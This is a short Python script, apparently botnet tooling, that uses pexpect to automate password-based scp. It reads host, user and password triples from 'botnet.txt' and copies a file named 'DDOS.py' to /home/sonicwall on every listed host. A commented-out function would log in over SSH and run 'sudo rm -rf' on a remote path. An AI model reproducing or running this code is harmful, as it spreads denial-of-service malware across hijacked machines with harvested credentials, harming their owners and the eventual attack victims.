#coding:utf-8
"""
Author:Hou Yuling
Time:10/9/2022 2:33 PM
"""
import pexpect
import sys
class Transfer():
    def __init__(self):
        print("Transfer working")
    # def deletefiles(self,filename,user,ip,password,dst_path):
    #     cmd1="ssh {}@{} -p 22".format(user,ip)
    #     print(cmd1)
    #     try:
    #         child=pexpect.spawn(cmd1)
    #         i=child.expect([pexpect.TIMEOUT,"password:"])
    #         if i == 0:
    #             print("Error!")
    #             print(child.before, child.after)
    #         child.expect("password:")
    #         child.sendline(password)
    #         child.expect("~$")
    #         child.sendline(" sudo rm -rf"+dst_path+"/"+filename)
    #         j=child.expect([pexpect.TIMEOUT,"password:"])
    #         if j == 0:
    #             print("Error!")
    #             print(child.before, child.after)
    #         child.expect("password:")
    #         child.sendline(password)
    #         child.expect("#")
    #         child.sendline("exit")
    #
    #         child.expect(pexpect.EOF)
    #         print("delete files success")
    #     except Exception as e:
    #         print("failed：", e)

    def transferfiles(self,filename,user,ip,password,dst_path):
        cmdline='scp -r {} {}@{}:{}'.format(filename,user,ip,dst_path)
        print(cmdline)
        try:
            child = pexpect.spawn(cmdline)
            promption="(yes/no)?"
            i=child.expect([pexpect.TIMEOUT,promption,"password:"])
            if i==0:
                print("Error!")
                print(child.before,child.after)
            if i==1:
                child.sendline('yes')
                child.expect("password:")
                child.sendline(password)
            child.sendline(password)
            child.expect(pexpect.EOF)
            print("file transfer finish")
        except Exception as e:
            print("failed：",e)
if __name__=="__main__":
    test=Transfer()
    filename = "DDOS.py"
    f = open("botnet.txt",'r')
    for line in f.readlines():
        line = line.strip('\n')
        host = line.split(":")[0]
        # print(host)
        user = line.split(":")[1]
        # print(user)
        password = line.split(":")[2]
        # print(password)
        ip=host
        user=user
        password=password
        dst_path="/home/sonicwall"
        #test.deletefiles(filename,user,ip,password,dst_path)
        test.transferfiles(filename,user,ip,password,dst_path)
